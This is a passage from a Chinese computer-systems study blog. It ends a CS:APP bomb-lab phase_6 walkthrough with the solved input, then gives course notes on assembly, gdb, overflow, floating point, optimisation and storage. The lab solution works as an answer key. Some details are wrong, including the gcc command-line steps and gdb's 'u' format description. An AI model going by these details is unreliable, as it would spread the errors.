 $0x0,0x8(%rdx)<br>  4011d9:00 <br>  4011da:bd 05 00 00 00       mov    $0x5,%ebp<br>  4011df:48 8b 43 08          mov    0x8(%rbx),%rax<br>  4011e3:8b 00                mov    (%rax),%eax<br>  4011e5:39 03                cmp    %eax,(%rbx)<br>  4011e7:7d 05                jge    4011ee &lt;phase_6+0xfa&gt;<br>  4011e9:e8 4c 02 00 00       callq  40143a &lt;explode_bomb&gt;<br>  4011ee:48 8b 5b 08          mov    0x8(%rbx),%rbx<br>  4011f2:83 ed 01             sub    $0x1,%ebp<br>  4011f5:75 e8                jne    4011df &lt;phase_6+0xeb&gt;<br>  4011f7:48 83 c4 50          add    $0x50,%rsp<br>  4011fb:5b                   pop    %rbx<br>  4011fc:5d                   pop    %rbp<br>  4011fd:41 5c                pop    %r12<br>  4011ff:41 5d                pop    %r13<br>  401201:41 5e                pop    %r14<br>  401203:c3                   retq  <br></code></pre></td></tr></table></figure></li><li><p><strong>解决思路：</strong></p><p>上述代码思路概括就是将链表结点数值按照降序排序，其对应的数值即为顺序，最后a[i]=7-a[i]，即为我们要输入的值。</p><p>首先我们用gdb指令查看链表的数据：</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317104905959.png" alt="image-20210317104905959"></p><p>这六个数字按照降序排列对应的编码顺序为：3  4  5  6  1  2</p><p>运算后即为：4 3 2 1 6 5</p><p>故密码为：4 3 2 1 6 5</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317105113068.png" alt="image-20210317105113068"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统笔记</title>
    <link href="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    <url>/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414171144939.png" alt="image-20210414171144939"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414171238561.png" alt="image-20210414171238561"></p><ul><li><p>终端</p><p>.c  -&gt;  .i    (预处理)           gcc -E hello.c -o hello.i    </p><p>.i   -&gt;  .s（汇编语言）     gcc -S hello.o -o hello.s</p><p>.s  -&gt;  .o（机器代码）     gcc -c  hello.o -o hello.o</p><p>查看.o    objdump hello.o  </p><p>变成可执行文件（链接）   gcc hello.o -o hello</p></li></ul><hr><h2 id="第二章-汇编入门"><a href="#第二章-汇编入门" class="headerlink" title="第二章 汇编入门"></a>第二章 汇编入门</h2><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315165706496.png" alt="image-20210315165706496"></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316104330207.png" alt="image-20210316104330207"></p><h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315165822191.png" alt="image-20210315165822191"></p><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210316111854447.png" alt="image-20210316111854447"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210316112953982.png"></p><h3 id="gdb-x-命令详解"><a href="#gdb-x-命令详解" class="headerlink" title="gdb x 命令详解"></a>gdb x 命令详解</h3><p>格式：x/&lt;n/f/u&gt; <addr></addr></p><p><strong>n</strong>:</p><p>是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义。</p><p><strong>f</strong>:</p><p>表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</p><p>x 按十六进制格式显示变量。</p><p>d 按十进制格式显示变量。</p><p>u 按十六进制格式显示无符号整型。</p><p>o 按八进制格式显示变量。</p><p>t 按二进制格式显示变量。</p><p>a 按十六进制格式显示变量。</p><p>c 按字符格式显示变量。</p><p>f 按浮点数格式显示变量。</p><p><strong>u</strong>:</p><p>就是指以多少个字节作为一个内存单元-unit,默认为4。当然u还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes.<br><addr>:表示内存地址。</addr></p><p>整合这个命令的诠释：就是以addr为起始地址，返回n个单元的值，每个单元对应u个字节，输出格式是f。</p><p>如：x/ 3uh 0x54320表示：以地址0x54320为起始地址，返回3个单元的值，每个单元有两个字节，输出格式为无符号十六进制。</p><p>也就是说返回了3*2=6个字节的数据，以十六进制输出，这6个字节的数据，每两个字节为一个单元输出，共输出3个单元。</p><h3 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315190744590.png" alt="image-20210315190744590"></p><p>栈顶是朝着低地址方向生长</p><h3 id="算术逻辑运算指令"><a href="#算术逻辑运算指令" class="headerlink" title="算术逻辑运算指令"></a>算术逻辑运算指令</h3><p>高32位放%edx</p><p>算术右移：填充符号位</p><p>逻辑移位：左边填0</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315190841025.png" alt="image-20210315190841025"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414183735292.png" alt="image-20210414183735292"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414183744478.png" alt="image-20210414183744478"></p><h3 id="条件跳转指令"><a href="#条件跳转指令" class="headerlink" title="条件跳转指令"></a>条件跳转指令</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315195500018.png" alt="image-20210315195500018"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315195530982.png" alt="image-20210315195530982"></p><h3 id="标志位指令"><a href="#标志位指令" class="headerlink" title="标志位指令"></a>标志位指令</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414173258979.png" alt="image-20210414173258979"></p><p>最后一提：计算机对带/无符号数的机器码统一处理<br>O F ， Ｃ Ｆ 等 标 志 位 是 由 机 器 码 运 算 结 果 决 定 的 ， 是 否 为 带 符 号 数 并 不 影 响 </p><p>终极简单的判定方法：</p><p>求OF就把机器码转成带符号数然后运算，看有没有溢出</p><p>求CF同理，转成无符号数，然后运算看有没有溢出</p><h3 id="正溢出-和-负溢出"><a href="#正溢出-和-负溢出" class="headerlink" title="正溢出 和 负溢出"></a>正溢出 和 负溢出</h3><p>如果位数 为w 的两个数x,y;且在系统中为补码表示，<br>如果：      -2^(w-1)&lt;=x+y&lt;2^(w-1) 则结果正常</p><p>x+y&lt;-2^(w-1)^发生负溢出 结果为x+y+2^w^<br>x+y&gt;=2^(w-1)^发生正溢出 结果为x+y-2^w^</p><p>推导过程:<br>对于一个w位，他所能表达值得范围：</p><p>比如 w=4:           0 0 0 0        最大值 0 1 1 1=7  (2^(4-1)-1)<br>最小值 1 0 0 0=-8  (-2^(4-1) )</p><p>超出这个范围将发生溢出，截断溢出位：            </p><p>负溢出+2^w<br>正溢出-2^w<br><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414173419106.png" alt="image-20210414173419106"></p><h3 id="条件码相关知识"><a href="#条件码相关知识" class="headerlink" title="条件码相关知识"></a>条件码相关知识</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315200213357.png" alt="image-20210315200213357"></p><h2 id="第三章-位字节和信息存储"><a href="#第三章-位字节和信息存储" class="headerlink" title="第三章 位字节和信息存储"></a>第三章 位字节和信息存储</h2><h3 id="信息的位与表示"><a href="#信息的位与表示" class="headerlink" title="信息的位与表示"></a>信息的位与表示</h3><ul><li><strong>典型数据类型的长度</strong></li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414182913863.png"></p><ul><li><p><strong>字节顺序</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414175028953.png" alt="image-20210414175028953"></p></li></ul><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414180814272.png"></p><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><h4 id="IEEE浮点数标准"><a href="#IEEE浮点数标准" class="headerlink" title="IEEE浮点数标准"></a>IEEE<strong>浮点数标准</strong></h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181040336.png" alt="image-20210414181040336"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181054897.png" alt="image-20210414181054897"></p><blockquote><p><strong>规格化值</strong></p></blockquote><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181116849.png" alt="image-20210414181116849"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181322258.png" alt="image-20210414181322258"></p><blockquote><p><strong>非规格化值</strong></p></blockquote><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181242656.png" alt="image-20210414181242656"></p><blockquote><p><strong>特殊值</strong></p></blockquote><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181430845.png" alt="image-20210414181430845"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210621222546804.png" alt="image-20210621222546804"></p><h4 id="舍入和运算"><a href="#舍入和运算" class="headerlink" title="舍入和运算"></a><strong>舍入和运算</strong></h4><blockquote><p><strong>浮点数舍入规则</strong></p></blockquote><p>如果以形式1.RR..RDD..D表示浮点数（R表示有效位，或保留位，而D表示舍去位），舍入规则就是：</p><p>如果DD..D &lt; 10..0，则向下舍入</p><p>如果DD..D &gt; 10..0，则向上舍入</p><p>如要DD..D = 10..0，则向最近偶数舍入，细则如下 ：</p><p>a. 如果RR..R = XX..0 （最低有效位是0），则向下舍入</p><p>b. 如果RR..R = XX..1（最低有效位是1），则向上舍入</p><blockquote><p><strong>浮点数运算</strong></p></blockquote><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414182405160.png" alt="image-20210414182405160"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414182418619.png" alt="image-20210414182418619"></p><h2 id="第四章-程序的机器级表示"><a href="#第四章-程序的机器级表示" class="headerlink" title="第四章  程序的机器级表示"></a>第四章  程序的机器级表示</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><h4 id="IA32寄存器"><a href="#IA32寄存器" class="headerlink" title="IA32寄存器"></a>IA32寄存器</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414184335897.png" alt="image-20210414184335897"></p><h4 id="算术操作"><a href="#算术操作" class="headerlink" title="算术操作"></a>算术操作</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414184419105.png" alt="image-20210414184419105"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414184428359.png" alt="image-20210414184428359"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414184615336.png" alt="image-20210414184615336"></p><h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185557502.png" alt="image-20210414185557502"></p><h4 id="条件码设置"><a href="#条件码设置" class="headerlink" title="条件码设置"></a>条件码设置</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185743149.png" alt="image-20210414185743149"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185759630.png" alt="image-20210414185759630"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185811106.png" alt="image-20210414185811106"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185821323.png" alt="image-20210414185821323"></p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210416102006727.png" alt="image-20210416102006727"></p><blockquote><p><strong>call指令</strong></p></blockquote><ol><li><p>把下一条指令地址压栈b</p></li><li><p>再把调用的函数地址给eip</p></li></ol><blockquote><p><strong>leave指令</strong></p></blockquote><ol><li>movl %ebp %esp  将esp回到上一个过程的栈顶位置，即ebp的地址</li><li>popl %ebp              将旧的ebp地址返回ebp</li></ol><blockquote><p><strong>ret</strong></p></blockquote><p>pop %eip  将下一条指令地址给%eip</p><h3 id="复杂数据的机器级表示"><a href="#复杂数据的机器级表示" class="headerlink" title="复杂数据的机器级表示"></a>复杂数据的机器级表示</h3><h2 id="第五章-优化程序性能"><a href="#第五章-优化程序性能" class="headerlink" title="第五章 优化程序性能"></a>第五章 优化程序性能</h2><h3 id="编译器的局限"><a href="#编译器的局限" class="headerlink" title="编译器的局限"></a>编译器的局限</h3><ul><li><p>妨碍优化的因素</p><ol><li><p>存储器的别名使用</p><p><strong>存储器别名使用</strong>是指两个指针可能同时指向同一个存储器的位置的情况。在只考虑执行安全的优化中，编译器必须假设不同的指针可能会指向存储器的同一个位置，这造成了<strong>第一个妨碍优化的因素</strong>，这也是可能严重限制编译器产生优化代码机会的程序的一个方面。如果编译器不能确定指针的指向，它就会假设所有的情况都有可能，所以我们需要做的就是在<strong>编写程序的时候明确指针的指向</strong>。</p></li><li><p>函数调用</p><p><strong>函数调用</strong>是<strong>第二个妨碍优化的因素</strong>。尽可能减少函数的调用可以优化程序，但是编译器会假设最糟糕的情况，并<strong>保持所有的函数调用不变</strong>。所以，我们需要在<strong>编写程序的时候将函数调用的次数尽可能减少</strong>，这件事情只能coder来做，编译器为了安全是不会去做的。</p></li></ol></li></ul><h3 id="表示程序性能"><a href="#表示程序性能" class="headerlink" title="表示程序性能"></a>表示程序性能</h3><ul><li><p>用<strong>每元素的周期数</strong>（Cycles Per Element ，<strong>CPE</strong>）作为<strong>程序性能的度量标准</strong>。它的计算过程是：先得到函数的元素个数和周期的散点图，后经过<strong>最小二乘方拟合</strong>得到折线图，其中<strong>折线的斜率</strong>表明<strong>每元素的周期数CPE</strong>。</p></li><li><p><strong>运行时间：</strong>一个元素完成功能所运行的时间</p></li><li><p><strong>周期数每元素(Cycles Per Element, CPE )</strong> ：运行时间/时钟周期</p></li><li><p><strong>时间周期：</strong>CPU完成一个基本动作的时间（对应一个电平信号宽度）</p></li><li><p>一个时钟周期是多长时间呢？<br>通常当一个标有“4GHz”的处理器，表示处理器每秒运行4X10^9个时钟周期，一个时钟周<br>期的时长是时钟频率的倒数，为0.25X10^{-9}秒=0.25纳秒（250皮秒）<br>Hz， KHz， MHz, GHz<br>秒， 毫秒， 微秒，纳秒</p></li></ul><h3 id="不依赖于机器特性的优化"><a href="#不依赖于机器特性的优化" class="headerlink" title="不依赖于机器特性的优化"></a>不依赖于机器特性的优化</h3><h4 id="1-消除循环的低效率"><a href="#1-消除循环的低效率" class="headerlink" title="1. 消除循环的低效率"></a>1. 消除循环的低效率</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210608153952303.png" alt="image-20210608153952303"></p><p>这个优化是一类常见的优化的一个例子，称为<strong>代码移动( code motion</strong>)。这类优化包括识别要执行多次（例如在循环里）但是计算结果不会改变的计算。因而可以将计算移动到代码前面不会被多次求值的部分。</p><h4 id="2-减少过程调用"><a href="#2-减少过程调用" class="headerlink" title="2. 减少过程调用"></a>2. 减少过程调用</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609142759377.png" alt="image-20210609142759377"></p><h4 id="3-消除不必要的存储器引用"><a href="#3-消除不必要的存储器引用" class="headerlink" title="3. 消除不必要的存储器引用"></a>3. 消除不必要的存储器引用</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609143101235.png" alt="image-20210609143101235"></p><h3 id="理解现代处理器"><a href="#理解现代处理器" class="headerlink" title="理解现代处理器"></a>理解现代处理器</h3><h4 id="功能单元的性能"><a href="#功能单元的性能" class="headerlink" title="功能单元的性能"></a>功能单元的性能</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162108070.png" alt="image-20210609162108070"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162041644.png" alt="image-20210609162041644"></p><ul><li><strong>延迟</strong>：完成运算所需要的总时间</li><li><strong>发射时间</strong>：表示两个连续的同类型的运算之间所需要的最小时钟周期数</li><li><strong>最大吞吐量</strong>：发射时间的倒数</li><li><strong>廷迟界限</strong>：给出了任何必须按照严格顺序完成合并运算的函数所需要的最小CPE值。</li><li><strong>吞吐量界限</strong>：根据功能单元产生结果的最大速率，吞吐量界限给出了CPE的最小界限。</li></ul><h4 id="处理器操作的抽象模型"><a href="#处理器操作的抽象模型" class="headerlink" title="处理器操作的抽象模型"></a>处理器操作的抽象模型</h4><h5 id="1-从机器级代码到数据流图"><a href="#1-从机器级代码到数据流图" class="headerlink" title="1.从机器级代码到数据流图"></a>1.从机器级代码到数据流图</h5><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162352543.png" alt="image-20210609162352543"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162425613.png" alt="image-20210609162425613"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162517278.png" alt="image-20210609162517278"></p><p>图中的链是限制性能的关键路径</p><h5 id="2-其他性能因素"><a href="#2-其他性能因素" class="headerlink" title="2.其他性能因素"></a>2.其他性能因素</h5><ul><li>数据流表示的的<strong>关键路径</strong>提供的只是<strong>程序需要周期数的下界</strong>，还有其他一些因素会限制性能，包括<br><strong>可用的功能单元的数量</strong>和<strong>任何一步中功能单元之间能够传递数据值的数量</strong>。</li></ul><h3 id="基于机器特性的优化"><a href="#基于机器特性的优化" class="headerlink" title="基于机器特性的优化"></a>基于机器特性的优化</h3><h4 id="1-循环展开"><a href="#1-循环展开" class="headerlink" title="1.循环展开"></a>1.循环展开</h4><p><strong>循环展开</strong>是一种程序变换，通过增加每次迭代计算的元素的数量，减少循环的迭代次数。</p><p>循环展开能够从<strong>两个方面</strong>改程序的性能：</p><ul><li><p>首先，它减少了不直接有助于程序结果的操作的数量，例如循环索引计算和条件分支。</p></li><li><p>其次，它提供了ー些方法，可以进一步变化代码，减少整个计算中关键路径上的操作数量。在本节中，我们会看一些简单的循环展开，不做任何进一步的变化</p></li></ul><p>循环展开示例：<img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609163517926.png" alt="image-20210609163517926"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609163640228.png" alt="image-20210609163640228"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619165210954.png" alt="image-20210619165210954"></p><p>循环展开可以提高整数加法和乘法的性能，因为GCC会对整数乘法做重关联变换，但不会改变浮点加法和乘法做做这种变化，所以性能并没有提升</p><h4 id="2-提高并行性"><a href="#2-提高并行性" class="headerlink" title="2.提高并行性"></a>2.提高并行性</h4><h5 id="1-多个累计变量"><a href="#1-多个累计变量" class="headerlink" title="1) 多个累计变量"></a>1) 多个累计变量</h5><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164539108.png" alt="image-20210609164539108"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164604747.png" alt="image-20210609164604747"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619165230377.png" alt="image-20210619165230377"></p><h5 id="2-重新结合变换"><a href="#2-重新结合变换" class="headerlink" title="2) 重新结合变换"></a>2) 重新结合变换</h5><p>改变合并顺序：</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164646452.png" alt="image-20210609164646452"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164734377.png" alt="image-20210609164734377"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164801356.png" alt="image-20210609164801356"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619165247136.png" alt="image-20210619165247136"></p><h3 id="一些限制因素"><a href="#一些限制因素" class="headerlink" title="一些限制因素"></a>一些限制因素</h3><ol><li>寄存器溢出</li><li>分支预测和预测错误处罚</li></ol><h3 id="理解存储器的性能"><a href="#理解存储器的性能" class="headerlink" title="理解存储器的性能"></a>理解存储器的性能</h3><h4 id="加载的性能"><a href="#加载的性能" class="headerlink" title="加载的性能"></a>加载的性能</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609171007080.png" alt="image-20210609171007080"></p><h4 id="存储的性能"><a href="#存储的性能" class="headerlink" title="存储的性能"></a>存储的性能</h4><h3 id="优化程序性能的基本策略"><a href="#优化程序性能的基本策略" class="headerlink" title="优化程序性能的基本策略"></a>优化程序性能的基本策略</h3><p><strong>1)高级设计</strong></p><p>为遇到的问题选择适当的算法和数据结构。要特别警觉，避免使用那些会渐进地产生糟糕性能的算法或编码技术。<br><strong>2)基本编码原则</strong></p><p>避免限制优化的因素，这样编译器就能产生高效的代码。</p><ul><li>消除连续的函数调用。在可能时，将计算移到循环外。考虑有选择地妥协程序的模块性以<br>获得更大的效率。</li><li>消除不必要的存储器引用。引人临时变量来保存中间结果。只有在最后的值计算出来时，<br>才将结果存放到数组或全局变量中。</li></ul><p><strong>3)低级优化</strong></p><ul><li>展开循环，降低开销，并且使得进一步的优化成为可能。</li><li>通过使用例如多个累积变量和重新结合等技术，找到方法提高指令级并行。</li><li>用功能的风格重写条件操作，使得编译采用条件数据传送。</li></ul><p><strong>Amdahl定律</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609171724722.png" alt="image-20210609171724722"></p><h2 id="第六章-存储器体系结构"><a href="#第六章-存储器体系结构" class="headerlink" title="第六章 存储器体系结构"></a>第六章 存储器体系结构</h2><h3 id="6-1-存储技术"><a href="#6-1-存储技术" class="headerlink" title="6.1 存储技术"></a>6.1 存储技术</h3><h4 id="1-1-随机访问存储器"><a href="#1-1-随机访问存储器" class="headerlink" title="1.1 随机访问存储器"></a>1.1 随机访问存储器</h4><p>分为静态的(SRAM)和动态的(DRAM)</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614140955548.png" alt="image-20210614140955548"></p><p><strong>传统的DRAM</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141026087.png" alt="image-20210614141026087"></p><p><strong>存储器模块</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141219177.png" alt="image-20210614141219177"></p><h4 id="1-2-磁盘存储"><a href="#1-2-磁盘存储" class="headerlink" title="1.2 磁盘存储"></a>1.2 磁盘存储</h4><p>磁盘是广为应用的保存大量数据的存储设备，存储数据的数量级可以达到几百到几千千兆字节，而基于RAM的存储器只能有几百或几千兆字节。不过，从磁盘上读信息的时间为毫秒级，从DRAM读比从磁盘读快10万倍，从SRAM读比从磁盘读快100万倍。</p><p><strong>磁盘容量计算</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141419194.png" alt="image-20210614141419194"></p><p><strong>磁盘操作</strong></p><p>磁盘以扇区大小的块来读写数据。对扇区的访问时间有三个主要的部分：寻道时间、旋转时间、传送时间。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141748772.png" alt="image-20210614141748772"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141816855.png" alt="image-20210614141816855"></p><p>因为寻道时间和旋转延迟大致是相等的，所以将寻道时间乘2是估计磁盘访问时间的简单而合理的办法。</p><h4 id="1-3-固态硬盘"><a href="#1-3-固态硬盘" class="headerlink" title="1.3 固态硬盘"></a>1.3 固态硬盘</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614162059129.png" alt="image-20210614162059129"></p><h3 id="6-2-局部性"><a href="#6-2-局部性" class="headerlink" title="6.2 局部性"></a>6.2 局部性</h3><h4 id="局部性原理"><a href="#局部性原理" class="headerlink" 